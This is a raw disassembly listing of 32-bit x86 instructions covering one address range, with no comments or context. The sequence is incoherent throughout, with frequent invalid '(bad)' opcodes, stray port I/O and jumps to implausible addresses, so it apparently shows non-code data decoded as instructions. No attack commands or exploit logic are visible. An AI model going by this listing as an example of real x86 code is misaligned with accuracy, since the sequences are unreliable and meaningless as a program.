  423496:	mov    bh,0x6
  423498:	fnsave [edx]
  42349a:	jo     0x4234a3
  42349c:	pop    eax
  42349d:	cwde   
  42349e:	ficom  DWORD PTR [ecx+0xc792371]
  4234a4:	push   edi
  4234a5:	mov    al,0x7d
  4234a7:	jb     0x423527
  4234a9:	jnp    0x423446
  4234ab:	pop    eax
  4234ac:	inc    edi
	...
  4234b9:	add    BYTE PTR [ebx-0xce42c16],cl
  4234bf:	cmp    ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	les    ebx,FWORD PTR [esi-0x516537d3]
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	sti    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [edx+0x61d4466f],dl
  4234d7:	adc    BYTE PTR [ebp+0x1aa2a85f],0xae
  4234de:	jge    0x42347e
  4234e0:	addr16 jo 0x423493
  4234e3:	js     0x4234cf
  4234e5:	repnz mov edi,0x7d31a9bd
  4234eb:	cld    
  4234ec:	sub    eax,0x8bf5759a
  4234f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234f2:	adc    esp,DWORD PTR es:[edx+0x77]
  4234f6:	enter  0xdab4,0x4c
  4234fa:	inc    DWORD PTR [edx+esi*8-0x7be22308]
  423501:	adc    ecx,DWORD PTR [eax-0x6]
  423504:	jge    0x4234a6
  423506:	mov    ch,0xd4
  423508:	mov    edx,0xe96aa119
  42350d:	inc    ebx
  42350e:	dec    ebx
  42350f:	ins    BYTE PTR es:[edi],dx
  423510:	xchg   ebx,eax
  423511:	and    eax,DWORD PTR [edx-0x1]
  423514:	xchg   BYTE PTR [edx-0x44],bl
  423517:	mov    esi,0x7a21837a
  42351c:	test   DWORD PTR [edi],ebp
  42351e:	mov    al,0xab
  423520:	std    
  423521:	xchg   ebp,eax
  423522:	aas    
  423523:	mov    bh,0x21
  423525:	daa    
  423526:	push   ss
  423527:	rcr    BYTE PTR [esi],1
  423529:	out    0x88,al
  42352b:	ins    DWORD PTR es:[edi],dx
  42352c:	inc    edi
  42352d:	outs   dx,BYTE PTR ds:[esi]
  42352e:	mov    dh,0xf6
  423530:	cmp    al,BYTE PTR [eax-0x5f528f1a]
  423536:	mov    ah,0x44
  423538:	cmp    BYTE PTR [eax+0x20d9c2a2],dl
  42353e:	cld    
  42353f:	(bad)  
  423540:	cmp    DWORD PTR [eax-0x50],eax
  423543:	mov    edi,0xb79f6e30
  423548:	out    dx,al
  423549:	xor    eax,0xf6149285
  42354e:	stc    
  42354f:	je     0x4234fc
  423551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423552:	jge    0x42357a
  423554:	data16 adc bl,BYTE PTR [eax]
  423557:	inc    esp
  423558:	pop    ebx
  423559:	mov    bh,al
  42355b:	shl    BYTE PTR [esi+0x77],1
  42355e:	and    al,0x5d
  423560:	aad    0x5
  423562:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423563:	inc    eax
  423564:	dec    eax
  423565:	rcr    BYTE PTR [esi+0x7f200bbc],cl
  42356b:	push   ebp
  42356c:	fild   WORD PTR [ebx]
  42356e:	jae    0x42353a
  423570:	ret    0x4509
  423573:	jno    0x4234fc
  423575:	pusha  
  423576:	and    al,0x0
  423578:	fcmovne st,st(4)
  42357a:	and    BYTE PTR [eax+0x4],dl
  42357d:	sbb    DWORD PTR [edx-0x1ba1cffc],0xf441d49c
  423587:	inc    ebp
  423588:	ret    0xb88b
  42358b:	mov    edi,0x4ff56df8
  423590:	adc    ecx,edi
  423592:	jl     0x42357c
  423594:	adc    ch,dl
  423596:	cdq    
  423597:	and    BYTE PTR [edx],bl
  423599:	cld    
  42359a:	fs or  eax,0x897c5d43
  4235a0:	(bad)  
  4235a2:	and    edx,DWORD PTR [edi+0x1f77a26]
  4235a8:	arpl   WORD PTR [ebx-0x1a3eb0cb],di
  4235ae:	(bad)  
  4235af:	ret    
  4235b0:	inc    ebp
  4235b1:	push   edx
  4235b2:	mov    ch,0x74
  4235b4:	dec    edi
  4235b5:	adc    DWORD PTR [eax],ebx
  4235b7:	mov    ah,0xb5
  4235b9:	mov    bh,0xa3
  4235bb:	pop    ds
  4235bc:	stc    
  4235bd:	ret    0xf460
  4235c0:	popf   
  4235c1:	and    eax,0xb02c8004
  4235c6:	xor    DWORD PTR [esi+0x3b],esi
  4235c9:	(bad)  
  4235ca:	call   0x1d55:0x6b35701b
  4235d1:	mov    ah,0x74
  4235d3:	inc    edx
  4235d4:	repnz and bh,0xdc
  4235d8:	push   0x15
  4235da:	sbb    DWORD PTR [ebp+0x1668370f],0x36c10777
  4235e4:	mov    BYTE PTR [esi],dh
  4235e6:	enter  0xda15,0xac
  4235ea:	clc    
  4235eb:	aaa    
  4235ec:	jmp    0xdadd932d
  4235f1:	xor    DWORD PTR [edx],0x8251fcb1
  4235f7:	out    0x1a,eax
  4235f9:	pop    eax
  4235fa:	xchg   edi,eax
  4235fb:	jle    0x4235c8
  4235fd:	js     0x423665
  4235ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423600:	hlt    
  423601:	xchg   ebx,eax
  423602:	into   
  423603:	loop   0x4235fe
  423605:	dec    esi
  423606:	add    ah,BYTE PTR [edx+0x14]
  423609:	aaa    
  42360a:	xchg   ebx,eax
  42360b:	xchg   esp,eax
  42360c:	cmp    BYTE PTR [ebp-0x2c],cl
  42360f:	cdq    
  423610:	push   0x67a9120c
  423615:	jnp    0x423629
  423617:	rcl    DWORD PTR fs:[ecx+0x7c887976],1
  42361e:	scas   al,BYTE PTR es:[edi]
  42361f:	into   
  423620:	dec    esp
  423621:	inc    esp
  423622:	sbb    DWORD PTR [ebp-0x57],ebp
  423625:	jb     0x4236a5
  423627:	idiv   BYTE PTR [esp+ebp*1+0x17923950]
  42362e:	or     eax,0x82a60d98
  423633:	and    dh,bl
  423635:	out    0x96,eax
  423637:	out    0x4c,al
  423639:	jo     0x4236b0
  42363b:	pop    ss
  42363c:	shr    DWORD PTR [edx+0x2d],1
  42363f:	mov    ebp,0x5f8942ba
  423644:	cli    
  423645:	cmp    BYTE PTR [esi+0x7f],cl
  423648:	pop    esp
  423649:	adc    eax,0x4b5d9050
  42364e:	setb   BYTE PTR [ebx+0x33]
  423652:	fwait
  423653:	daa    
  423654:	std    
  423655:	push   esp
  423656:	repz pop esi
  423658:	imul   ebx,DWORD PTR ds:0x18fe3f8a,0x4d
  42365f:	dec    esi
  423660:	in     al,0x90
  423662:	xchg   ecx,eax
  423663:	out    dx,al
  423664:	dec    edi
  423665:	(bad)  
  423667:	popa   
  423668:	xchg   BYTE PTR [ebx+0x1a6b16bc],dl
  42366e:	das    
  42366f:	push   0xe5f28be2
  423674:	mov    ch,0x28
  423676:	or     edi,esi
  423678:	std    
  423679:	sub    DWORD PTR [ecx-0x62d5de1c],ecx
  42367f:	xor    eax,0x234ca292
  423684:	xchg   edi,eax
  423685:	dec    esp
  423686:	add    bh,BYTE PTR ds:0x2e1fb24f
  42368c:	push   ds
  42368d:	jecxz  0x4236ee
  42368f:	lods   eax,DWORD PTR ds:[esi]
  423690:	fst    DWORD PTR [edi-0x26]
  423693:	sub    BYTE PTR [edx],ch
  423695:	je     0x4236a2
  423697:	xchg   ebp,eax
  423698:	mov    al,0x32
  42369a:	fldl2t 
  42369c:	push   0xe3048b1c
  4236a1:	in     al,dx
  4236a2:	(bad)  
  4236a3:	loope  0x4236b5
  4236a5:	jle    0x423687
  4236a7:	xor    esi,DWORD PTR [edx+0x14d4196c]
  4236ad:	jbe    0x4236ca
  4236af:	inc    esp
  4236b0:	dec    edx
  4236b1:	mov    eax,ds:0x73271e6c
  4236b7:	lea    bx,[esi+0x231ad792]
  4236be:	scas   eax,DWORD PTR es:[edi]
  4236bf:	addr16 push ss
  4236c1:	jecxz  0x4236bd
  4236c3:	int3   
  4236c4:	lea    ecx,[esi+0x69]
  4236c7:	fidiv  WORD PTR [ecx]
  4236c9:	sti    
  4236ca:	popf   
  4236cb:	add    edx,esp
	...
  4236d9:	add    dl,dl
  4236db:	and    dl,BYTE PTR [esi-0x21410966]
  4236e1:	push   0x61
  4236e3:	push   cs
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	xor    eax,0x95b08545
  4236eb:	mov    al,0x1
  4236ed:	add    bl,bh
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    ch,ch
  4236f3:	popa   
  4236f4:	add    DWORD PTR [edi],ebx
  4236f6:	sahf   
  4236f7:	cmp    edx,DWORD PTR [eax-0x6e]
  4236fa:	jle    0x4236ed
  4236fc:	xchg   esp,eax
  4236fd:	rcr    BYTE PTR [ebx+ecx*4-0xa],0x48
  423702:	xor    bh,BYTE PTR [ebx]
  423704:	imul   ecx,DWORD PTR [eax+0x3a7a5bd2],0x3c67dfd5
  42370e:	loopne 0x42378b
  423710:	fcomp  DWORD PTR [esi-0x64]
  423713:	imul   eax,edx,0xffffffa1
  423716:	xor    eax,0x54e97ca6
  42371b:	fiadd  DWORD PTR [ecx]
  42371d:	inc    eax
  42371e:	jge    0x423783
  423720:	add    BYTE PTR [eax],0x56
  423723:	into   
  423724:	cdq    
  423725:	pusha  
  423726:	ret    
  423727:	adc    DWORD PTR [ebp+0x9],eax
  42372a:	jle    0x423739
  42372c:	aad    0xea
  42372e:	xor    esp,DWORD PTR [eax-0x2e]
  423731:	mov    bl,0x98
  423733:	ret    0xf67a
  423736:	adc    esp,DWORD PTR [edi-0x37]
  423739:	mov    fs,WORD PTR [eax]
  42373b:	(bad)  
  42373c:	(bad)  
  42373d:	jae    0x42377a
  42373f:	push   cs
  423740:	shr    BYTE PTR [edx],0x90
  423743:	cwde   
  423744:	fsubr  st,st(2)
  423746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423747:	push   ebx
  423748:	sbb    ch,BYTE PTR [eax+ebp*8]
  42374b:	fwait
  42374c:	pop    esi
  42374d:	shl    BYTE PTR [eax],cl
  42374f:	nop
  423750:	xchg   ecx,eax
  423751:	in     al,dx
  423752:	lea    ebp,[eax]
  423754:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423755:	bnd jg 0x423793
  423758:	push   edx
  423759:	and    al,0xe9
  42375b:	inc    edx
  42375c:	loope  0x423730
  42375e:	xor    eax,0x89ff9e2a
  423763:	pop    edi
  423764:	aad    0x46
  423766:	jb     0x423715
  423768:	inc    ecx
  423769:	jns    0x423751
  42376b:	(bad)  
  42376c:	lahf   
  42376d:	jle    0x423786
  42376f:	icebp  
  423770:	sahf   
  423771:	or     eax,0xbf010c6a
  423776:	hlt    
  423777:	gs pop ecx
  423779:	aas    
  42377a:	xor    eax,0xa35ade18
  42377f:	in     eax,dx
  423780:	bound  ebx,QWORD PTR [edi+ecx*1-0x9684e23]
  423787:	xchg   ecx,eax
  423788:	pop    ss
  423789:	add    eax,0xbd6345a4
  42378e:	inc    eax
  42378f:	js     0x4237f5
  423791:	lods   al,BYTE PTR ds:[esi]
  423792:	shr    DWORD PTR [edi+0x345f100a],0x8d
  423799:	es mov cl,0xa1
  42379c:	dec    ch
  42379e:	sar    DWORD PTR fs:[edx+0x72],0x34
  4237a3:	out    dx,al
  4237a4:	in     al,dx
  4237a5:	jl     0x4237df
  4237a7:	sub    eax,0xf30e57bd
  4237ac:	jecxz  0x423781
  4237ae:	pusha  
  4237af:	jb     0x423818
  4237b1:	inc    esp
  4237b2:	jge    0x423806
  4237b4:	mov    edi,0xad771fc6
  4237b9:	icebp  
  4237ba:	sbb    eax,0x3cf7b1b7
  4237bf:	fnstcw WORD PTR [edx]
  4237c1:	out    dx,eax
  4237c2:	jne    0x4237e9
  4237c4:	mov    edx,0x1320d876
  4237c9:	fdiv   DWORD PTR [ebx+0x1d668c4a]
  4237cf:	cld    
  4237d0:	call   DWORD PTR [esi]
  4237d2:	enter  0x8320,0xa9
  4237d6:	mov    edx,0xf163016f
  4237db:	sbb    DWORD PTR [edx],esp
  4237dd:	(bad)  
  4237de:	push   cs
  4237df:	pop    ebp
  4237e0:	call   0xdfe385ef
  4237e5:	cmp    DWORD PTR [ebp+0x8],ebp
  4237e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237e9:	mov    ah,0x73
  4237eb:	jmp    0x423791
  4237ed:	cmp    DWORD PTR [edx],edx
  4237ef:	xlat   BYTE PTR ds:[ebx]
  4237f0:	mov    dh,0x96
  4237f2:	and    al,0xd7
  4237f4:	cmc    
  4237f5:	jmp    0x32b4acb6
  4237fa:	pop    esi
  4237fb:	push   0xffffffe2
  4237fd:	int3   
  4237fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237ff:	xchg   ebx,eax
  423800:	repnz mov fs,WORD PTR [esp+ebx*2+0x6a]
  423805:	out    dx,eax
  423806:	sub    ebp,eax
  423808:	mov    ds:0xf7996416,al
  42380d:	xchg   esp,eax
  42380e:	xchg   ecx,eax
  42380f:	push   esi
  423810:	aam    0xf5
  423812:	push   esi
  423813:	mov    ebp,0x5dea3500
  423818:	in     al,dx
  423819:	xchg   esi,eax
  42381a:	imul   edi,DWORD PTR [esi-0x25d8fb09],0x79
  423821:	in     al,0x3b
  423823:	(bad)  
  423824:	xor    al,BYTE PTR [eax]
  423826:	js     0x423859
  423828:	nop
  423829:	sti    
  42382a:	xor    BYTE PTR [eax],cl
  42382c:	arpl   cx,di
  42382e:	mov    ds:0x8a6a2fde,eax
  423833:	pop    ebp
  423834:	and    DWORD PTR [ebp+0xc],edx
  423837:	or     al,0xcc
  423839:	sbb    eax,0x3056b697
  42383e:	dec    esi
  42383f:	icebp  
  423840:	sbb    BYTE PTR [eax-0x76796d46],bl
  423846:	mov    bh,0x25
  423848:	daa    
  423849:	and    BYTE PTR [ecx+esi*1+0x2747fcd2],al
  423850:	gs or  al,0xa7
  423853:	aam    0xd1
  423855:	lods   eax,DWORD PTR ds:[esi]
  423856:	jmp    0xaaf535c0
  42385b:	dec    esp
  42385c:	mov    ah,0xc4
  42385e:	mov    eax,ds:0x9b1854df
  423863:	ins    DWORD PTR es:[edi],dx
  423864:	inc    edi
  423865:	mov    ebx,0xed21e424
  42386a:	fmul   DWORD PTR [ebx]
  42386c:	xchg   BYTE PTR [ecx],dl
  42386e:	out    0x4e,eax
  423870:	aaa    
  423871:	inc    ebp
  423872:	sti    
  423873:	std    
  423874:	adc    edx,DWORD PTR [esi-0x7a6af49c]
  42387a:	or     esp,0x9891d6f0
  423880:	cld    
  423881:	sub    edi,DWORD PTR [esi+0x4a]
  423884:	adc    dl,BYTE PTR [ecx]
  423886:	sbb    DWORD PTR cs:[ebp+0x7],eax
  42388a:	jl     0x4238ff
  42388c:	inc    ebp
  42388d:	xchg   ecx,esp
  42388f:	cmc    
  423890:	or     esp,DWORD PTR [esi-0x32288eaa]
  423896:	popa   
  423897:	mov    BYTE PTR [ebp-0x48],bl
  42389a:	xchg   ebp,eax
  42389b:	fucomip st,st(0)
  42389d:	and    DWORD PTR [edx+ebp*2],0x54b38afa
  4238a4:	cld    
  4238a5:	enter  0x3b6d,0xe0
  4238a9:	scas   al,BYTE PTR es:[edi]
  4238aa:	jp     0x423851
  4238ac:	mov    dl,0xa6
  4238ae:	fnstenv [ebx+0x1e]
  4238b1:	mov    bl,0xb4
  4238b3:	inc    ecx
  4238b4:	outs   dx,BYTE PTR ds:[esi]
  4238b5:	jae    0x4238e4
  4238b7:	dec    ecx
  4238b8:	aad    0x7d
  4238ba:	(bad)  
  4238bb:	idiv   DWORD PTR [esp+esi*8-0x17]
  4238bf:	add    al,0xcf
  4238c1:	or     edx,DWORD PTR [eax+0x39a72dcb]
  4238c7:	pop    ds
  4238c8:	retf   
  4238c9:	dec    esi
  4238ca:	push   ss
  4238cb:	js     0x4238ac
  4238cd:	cld    
  4238ce:	or     esi,DWORD PTR [ebx-0x4f3428c1]
  4238d4:	push   ebp
  4238d5:	or     ch,BYTE PTR [esi+0x5e5b0e21]
  4238db:	jae    0x4238b4
  4238dd:	popf   
  4238de:	inc    eax
  4238df:	outs   dx,BYTE PTR ds:[esi]
  4238e0:	mov    esp,0x1cb97453
  4238e5:	cmp    edx,DWORD PTR [ebx+0x47094fe9]
  4238eb:	mov    bl,BYTE PTR [edx+0x0]
	...
  4238f9:	add    ch,bl
  4238fb:	cmp    al,0x8f
  4238fd:	mov    esp,0x7dffbfef
  423902:	in     al,dx
  423903:	outs   dx,BYTE PTR ds:[esi]
  423904:	fs push esp
  423906:	or     dh,bl
  423908:	cmp    edx,edx
  42390a:	nop
  42390b:	mov    dl,0x1
  42390d:	add    bl,bh
  42390f:	add    DWORD PTR [eax],eax
  423911:	add    BYTE PTR [ecx],ch
  423913:	push   edx
  423914:	mov    ds:0x944ea1fa,al
  423919:	in     eax,0xea
  42391b:	sti    
  42391c:	jae    0x42393d
  42391e:	into   
  42391f:	push   ds
  423920:	enter  0xce2f,0x9d
  423924:	lea    edx,[edi]
  423926:	out    dx,al
  423927:	push   es
  423928:	add    al,0x2e
  42392a:	in     eax,0x7f
  42392c:	jno    0x4238b3
  42392e:	mov    eax,ds:0xb514b590
  423933:	pop    es
  423934:	nop
  423935:	rcr    bh,0xd1
  423938:	pop    ecx
  423939:	cdq    
  42393a:	retf   
  42393b:	outs   dx,BYTE PTR ds:[esi]
  42393c:	(bad)
  423940:	mov    ah,dl
  423942:	in     al,0x84
  423944:	int3   
  423945:	rcr    BYTE PTR [edi+ebp*2],1
  423948:	sar    DWORD PTR [edx-0x78],cl
  42394b:	push   es
  42394c:	test   BYTE PTR [esi+edi*8+0x3215a425],0x44
  423954:	enter  0xf234,0xe
  423958:	hlt    
  423959:	in     eax,0x6b
  42395b:	retf   0x224b
  42395e:	dec    edi
  42395f:	mov    esp,0x9a20b250
  423964:	into   
  423965:	mov    ebp,0x19915be
  42396a:	adc    al,0x1
  42396c:	xor    edi,DWORD PTR [ebp-0x414c24a3]
  423972:	inc    eax
  423973:	inc    edx
  423974:	in     eax,dx
  423975:	or     al,0x96
  423977:	xor    bh,bl
  423979:	aas    
  42397a:	inc    ecx
  42397b:	mov    ebx,eax
  42397d:	aam    0x4c
  42397f:	mov    ds:0xccb5f165,al
  423984:	pop    edx
  423985:	xor    bh,BYTE PTR [ecx-0x7b]
  423988:	push   edx
  423989:	push   ecx
  42398a:	sub    BYTE PTR [esi-0x65],bl
  42398d:	jne    0x423937
  42398f:	or     ebp,DWORD PTR ds:0xcfcdde1b
  423995:	fisubr DWORD PTR [ecx]
  423997:	sahf   
  423998:	xor    esp,ebx
  42399a:	stc    
  42399b:	fidiv  WORD PTR [ecx-0x7048ce56]
  4239a1:	clc    
  4239a2:	sbb    eax,0x19f78dc7
  4239a7:	jb     0x423976
  4239a9:	jae    0x423a1b
  4239ab:	jmp    0x4239f2
  4239ad:	mov    ebx,0x92e7de4a
  4239b2:	pop    es
  4239b3:	lods   al,BYTE PTR ds:[esi]
  4239b4:	or     eax,0x48e3944d
  4239b9:	xor    eax,0xef0efd98
  4239be:	popf   
  4239bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239c0:	cmp    eax,0xb71d2818
  4239c5:	stc    
  4239c6:	mov    esi,0x7459e3fd
  4239cb:	jo     0x423975
  4239cd:	or     BYTE PTR [eax+edx*1+0x49a5a12c],ah
  4239d4:	icebp  
  4239d5:	fsubrp st(6),st
  4239d7:	fwait
  4239d8:	imul   ebx,DWORD PTR [eax],0xd5ff6568
  4239de:	mov    al,ds:0xaabf6936
  4239e3:	sub    BYTE PTR [edx+ebp*1+0x367e6145],bh
  4239ea:	out    dx,eax
  4239eb:	loopne 0x4239ee
  4239ed:	sahf   
  4239ee:	jnp    0x423978
  4239f0:	pop    es
  4239f1:	mov    WORD PTR [edi-0x6ba4f7e2],cs
  4239f7:	cmc    
  4239f8:	and    BYTE PTR [ebx-0x4e],cl
  4239fb:	mov    BYTE PTR [ebx],bl
  4239fd:	les    ebx,FWORD PTR [ebx]
  4239ff:	push   ds
  423a00:	test   eax,0x6825e4cd
  423a05:	xchg   ecx,edx
  423a07:	in     al,dx
  423a08:	jno    0x423a73
  423a0a:	imul   esp
  423a0c:	pop    esp
  423a0e:	or     bl,BYTE PTR ds:0xdf5ed6ad
  423a14:	(bad)  
  423a15:	(bad)  
  423a17:	pop    es
  423a18:	clc    
  423a19:	dec    eax
  423a1a:	loop   0x423a58
  423a1c:	add    esi,esp
  423a1e:	jb     0x423a6e
  423a20:	(bad)  
  423a21:	sbb    al,0xac
  423a23:	or     DWORD PTR [ebp+0x52],ebx
  423a26:	inc    esi
  423a27:	jns    0x423a2c
  423a29:	test   al,0x71
  423a2b:	ins    DWORD PTR es:[edi],dx
  423a2c:	dec    eax
  423a2d:	fnop   
  423a2f:	cli    
  423a30:	inc    esi
  423a31:	stos   BYTE PTR es:[edi],al
  423a32:	cld    
  423a33:	mov    dh,0xbd
  423a35:	loope  0x4239c8
  423a37:	cmp    DWORD PTR [ecx+0x74],0xc7c441fb
  423a3e:	sbb    eax,0x6deb25df
  423a43:	mov    esi,0xb39a942c
  423a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423a49:	adc    DWORD PTR ds:0xb38c4cb8,ebp
  423a4f:	xor    ecx,eax
  423a51:	cs popf 
  423a53:	call   DWORD PTR [ebp+0x20]
  423a56:	sub    dh,bh
  423a58:	hlt    
  423a59:	and    DWORD PTR [eax],edx
  423a5b:	(bad)  
  423a5c:	(bad)  [ecx+ebx*4]
  423a5f:	push   eax
  423a60:	jp     0x4239e2
  423a62:	adc    DWORD PTR [eax+0x1df9fcfb],ecx
  423a68:	jnp    0x423a39
  423a6a:	mov    ecx,esi
  423a6c:	js     0x423a94
  423a6e:	mov    cl,0x75
  423a70:	int3   
  423a71:	mov    edi,0x1ac13fa9
  423a76:	inc    ecx
  423a77:	dec    ebp
  423a78:	cli    
  423a79:	xor    al,0xb1
  423a7b:	dec    ebp
  423a7c:	(bad)  
  423a7d:	fs into 
  423a7f:	mov    al,0x62
  423a81:	dec    ecx
  423a82:	ds fs ins BYTE PTR es:[edi],dx
  423a85:	fcmovbe st,st(2)
  423a87:	push   ds
  423a88:	mov    al,ds:0x735562d5
  423a8d:	cmp    cl,BYTE PTR ds:0xb8c601b
  423a93:	ss pop ss
  423a95:	mov    ss,WORD PTR [edi+0x76]
  423a98:	repnz sbb DWORD PTR [esi-0x1b],0x5a745e23
  423aa0:	js     0x423a9a
  423aa2:	out    0x74,eax
  423aa4:	imul   ebx,DWORD PTR [edi],0x3
  423aa7:	or     cl,BYTE PTR [edx+0x38a5dfe0]
  423aad:	mov    ds:0x8b240640,al
  423ab2:	and    DWORD PTR [esi+eax*1-0x6a],esi
  423ab6:	jne    0x423a4a
  423ab8:	arpl   WORD PTR [ebp-0xa],dx
  423abb:	test   eax,0xdd2c4c5d
  423ac0:	cdq    
  423ac1:	xlat   BYTE PTR ds:[ebx]
  423ac2:	shl    BYTE PTR [ecx-0x4b2413e3],0x71
  423ac9:	fdivr  QWORD PTR [ecx-0x3]
  423acc:	mov    bh,0x8e
  423ace:	push   ds
  423acf:	out    0x78,al
  423ad1:	sbb    BYTE PTR [eax-0x3fade96a],0xae
  423ad8:	call   0x6d3:0x16bdbd0e
  423adf:	pushf  
  423ae0:	mov    bl,0xe3
  423ae2:	add    DWORD PTR [ebx-0x73],esi
  423ae5:	jle    0x423add
  423ae7:	out    0x99,eax
  423ae9:	jbe    0x423af5
  423aeb:	lock add al,0x3f
  423aee:	sub    al,0xf6
  423af0:	sbb    DWORD PTR [ecx+eiz*1+0x53],0xfffffffe
  423af5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423af6:	out    0x1d,al
  423af8:	les    edi,FWORD PTR [ebx+edi*4]
  423afb:	and    BYTE PTR [esi-0x11],ah
  423afe:	out    0x7b,eax
  423b00:	mov    bl,0x6
  423b02:	push   0xa4e036a7
  423b07:	pop    es
  423b08:	and    BYTE PTR [ebx+0xe02482],0x0
	...
  423b17:	add    BYTE PTR [eax],al
  423b19:	add    BYTE PTR [esi-0x4fd6421],dh
  423b1f:	inc    esi
  423b20:	mov    edi,0x261aff
  423b25:	jb     0x423ac4
  423b27:	jns    0x423ba0
  423b29:	dec    esp
  423b2a:	mov    esi,DWORD PTR [ecx+eax*1+0x1fb00]
  423b31:	add    BYTE PTR [edi],bl
  423b33:	dec    ecx
  423b34:	out    dx,eax
  423b35:	out    0x5c,al
  423b37:	pop    esp
  423b38:	loopne 0x423ac8
  423b3a:	inc    esi
  423b3b:	add    al,0x6d
  423b3d:	out    0x8f,eax
  423b3f:	stc    
  423b40:	pop    ds
  423b41:	ficom  WORD PTR [ebp-0xb760c30]
  423b47:	les    ebp,FWORD PTR [ebx]
  423b49:	push   ebp
  423b4a:	test   eax,0x7353319d
  423b4f:	lods   eax,DWORD PTR ds:[esi]
  423b50:	in     eax,0x61
  423b52:	leave  
  423b53:	clc    
  423b54:	jae    0x423bce
  423b56:	iret   
  423b57:	hlt    
  423b58:	in     eax,dx
  423b59:	aas    
  423b5a:	xchg   BYTE PTR [eax],ah
  423b5c:	xchg   edx,eax
  423b5d:	out    dx,al
  423b5e:	dec    eax
  423b5f:	jb     0x423bab
  423b61:	sti    
  423b62:	push   ebp
  423b63:	cs push ebx
  423b65:	pop    eax
  423b66:	ja     0x423b9f
  423b68:	add    eax,0xdcdc877
  423b6d:	dec    esp
  423b6e:	dec    edx
  423b6f:	ret    
  423b70:	imul   esi,DWORD PTR ds:0xec09a20,0x6d
  423b77:	and    esp,edi
  423b79:	cdq    
  423b7a:	jns    0x423b64
  423b7c:	mov    eax,0xab59461a
  423b81:	push   edi
  423b82:	cmp    eax,0xc80e8e7
  423b87:	js     0x423b8b
  423b89:	inc    DWORD PTR [edi*1+0x10be604f]
  423b90:	xchg   ebx,eax
  423b91:	ret    
  423b92:	add    esi,edi
  423b94:	pop    ebx
  423b95:	sub    al,0x7
  423b97:	mov    al,0x88
  423b99:	dec    edi
  423b9a:	mov    cl,0xc1
  423b9c:	and    al,0x2b
  423b9e:	aam    0x44
  423ba0:	mov    bl,0xe2
  423ba2:	add    eax,0x3c2644a1
  423ba7:	in     eax,0x9b
  423ba9:	and    eax,0xf567b459
  423bae:	aas    
  423baf:	sub    eax,0xbb7e2a48
  423bb4:	mov    bh,BYTE PTR [eax-0x5b]
  423bb7:	xchg   ebp,eax
  423bb8:	test   ah,bl
  423bba:	add    eax,0x92013c14
  423bbf:	and    BYTE PTR [eax+ebp*4],0xdf
  423bc3:	xchg   BYTE PTR ds:0xf383801b,al
  423bc9:	xor    BYTE PTR [eax],dl
  423bcb:	push   cs
  423bcc:	mov    esi,0xcb0ccd27
  423bd1:	aad    0x66
  423bd3:	cmp    BYTE PTR [ebx+0xd27f517],bl
  423bd9:	cmp    BYTE PTR [edi-0x7f],cl
  423bdc:	pop    esi
  423bdd:	scas   al,BYTE PTR es:[edi]
  423bde:	outs   dx,BYTE PTR ds:[esi]
  423bdf:	mov    dh,BYTE PTR [eax+0x6a19a692]
  423be5:	ds out dx,al
  423be7:	push   ebp
  423be8:	mov    ah,0xfd
  423bea:	int    0x25
  423bec:	in     eax,0x34
  423bee:	(bad)
  423bf1:	push   ebx
  423bf2:	nop
  423bf3:	push   0x1a1b67ba
  423bf8:	xor    dl,BYTE PTR [ecx-0x3d]
  423bfb:	aas    
  423bfc:	add    bl,cl
  423bfe:	aaa    
  423bff:	mov    edx,ebp
  423c01:	jge    0x423c70
  423c03:	std    
  423c04:	dec    ebp
  423c05:	sbb    edi,DWORD PTR ds:0x5a62d6dc
  423c0b:	xor    eax,0x29b4571a
  423c10:	sbb    ebp,edi
  423c12:	pop    eax
  423c13:	ja     0x423b9e
  423c15:	(bad)  
  423c16:	sub    BYTE PTR [ecx],dh
  423c18:	mov    BYTE PTR [esi+0xf9f8b84],ch
  423c1e:	(bad)  
  423c1f:	in     al,0x28
  423c21:	push   esi
  423c22:	dec    eax
  423c23:	jnp    0x423bdc
  423c25:	push   ss
  423c26:	inc    ebp
  423c27:	gs lock ins DWORD PTR es:[edi],dx
  423c2a:	mov    esi,DWORD PTR [ecx+0x3e]
  423c2d:	aaa    
  423c2e:	jecxz  0x423c72
  423c30:	out    0x3b,al
  423c32:	retf   0xb648
  423c35:	mov    esp,0x59b91e1b
  423c3a:	rcr    BYTE PTR [edx+0x7d],1
  423c3d:	(bad)  
  423c3e:	aam    0x1e
  423c40:	pop    es
  423c41:	add    bh,BYTE PTR [ecx+0x2a4cf099]
  423c47:	add    eax,0xcc840f1f
  423c4c:	fcomp  QWORD PTR [ecx]
  423c4e:	adc    eax,0x1a8fb23a
  423c53:	adc    eax,0x83108f7c
  423c58:	in     al,dx
  423c59:	test   BYTE PTR [edx-0x60],dh
  423c5c:	pop    edx
  423c5d:	sar    DWORD PTR [edx],1
  423c5f:	add    ch,al
  423c61:	or     BYTE PTR [eax],0x80
  423c64:	pop    es
  423c65:	pop    esi
  423c66:	bound  esp,QWORD PTR ds:[eax]
  423c69:	in     eax,0xb6
  423c6b:	sub    ebx,DWORD PTR [edi+0x7b]
  423c6e:	test   al,0x6f
  423c70:	loop   0x423c64
  423c72:	int3   
  423c73:	dec    ecx
  423c74:	leave  
  423c75:	int    0x4
  423c77:	in     al,dx
  423c78:	out    0xdc,eax
  423c7a:	jl     0x423c55
  423c7c:	jnp    0x423ca3
  423c7e:	and    BYTE PTR [bp+si-0x3bd0],cl
  423c83:	mov    BYTE PTR [ecx-0x3a],ch
  423c86:	int    0x26
  423c88:	pop    ecx
  423c89:	daa    
  423c8a:	repnz rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
